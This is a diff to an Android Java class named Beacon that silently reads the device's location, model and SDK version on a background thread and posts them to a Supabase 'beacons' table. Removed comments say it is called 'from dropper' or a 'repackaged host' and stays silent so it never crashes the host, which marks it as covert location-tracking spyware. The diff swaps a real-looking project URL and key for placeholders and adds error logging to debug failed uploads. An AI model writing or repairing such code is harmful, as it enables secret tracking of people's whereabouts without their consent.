@@ -8,6 +8,7 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.BatteryManager;
 import android.os.Looper;
+import android.util.Log;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -17,20 +18,18 @@ import java.nio.charset.StandardCharsets;
 
 public final class Beacon {
 
-    // Supabase project — fill these two before compiling
-    private static final String SB_URL  = "https://klhccerhzugvftsyuqwr.supabase.co";
-    private static final String SB_KEY  = "sb_publishable_Pk0IONAQXkY2Q7dQ5ULJTA_yYmr-izj";
+    // IMPORTANT: SB_KEY must be the long JWT token (anon public key), NOT the "sb_publishable_..." string.
+    private static final String SB_URL  = "YOUR-PROJECT-REF.supabase.co"; 
+    private static final String SB_KEY  = "YOUR-ANON-PUBLIC-KEY";
 
     private Beacon() {}
 
-    /** Entry point — call from dropper (MainActivity / Worker / repackaged host). */
     public static void fire(final Context ctx) {
         new Thread(new Runnable() {
             @Override public void run() {
                 try {
                     Double lat = null, lon = null;
 
-                    // 1. try last-known cache from all providers
                     final LocationManager lm =
                         (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
                     if (lm != null) {
@@ -40,8 +39,7 @@ public final class Beacon {
                         }
                     }
 
-                    // 2. cache miss → request one fresh fix (10 s timeout)
-                    if (lat == null && hasLoc(ctx)) {
+                    if (lat == null && hasLoc(ctx) && lm != null) {
                         final Object[] box = new Object[1];
                         final LocationListener lis = new LocationListener() {
                             @Override public void onLocationChanged(Location l) {
@@ -63,7 +61,7 @@ public final class Beacon {
 
                     post(ctx, lat, lon);
                 } catch (final Throwable t) {
-                    // silent — never crash the host
+                    Log.e("BeaconError", "Location fetch failed", t);
                 }
             }
         }).start();
@@ -96,8 +94,8 @@ public final class Beacon {
                 "\"model\":\"" + model + "\"," +
                 "\"sdk\":" + sdk + "}";
 
-            conn = (HttpURLConnection) new URL(SB_URL + "/rest/v1/beacons")
-                .openConnection();
+            String targetUrl = SB_URL.startsWith("http") ? SB_URL : "https://" + SB_URL;
+            conn = (HttpURLConnection) new URL(targetUrl + "/rest/v1/beacons").openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setConnectTimeout(15_000);
@@ -110,9 +108,20 @@ public final class Beacon {
             final byte[] body = json.getBytes(StandardCharsets.UTF_8);
             conn.setFixedLengthStreamingMode(body.length);
             conn.getOutputStream().write(body);
-            conn.getResponseCode(); // drain
+            
+            int responseCode = conn.getResponseCode();
+            
+            // Debugging: Read error stream if Supabase rejects the insert
+            if (responseCode >= 400 && conn.getErrorStream() != null) {
+                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) sb.append(line);
+                Log.e("BeaconError", "Supabase HTTP " + responseCode + ": " + sb.toString());
+            }
+
         } catch (final Throwable t) {
-            // silent
+            Log.e("BeaconError", "Network post failed", t);
         } finally {
             if (conn != null) conn.disconnect();
         }
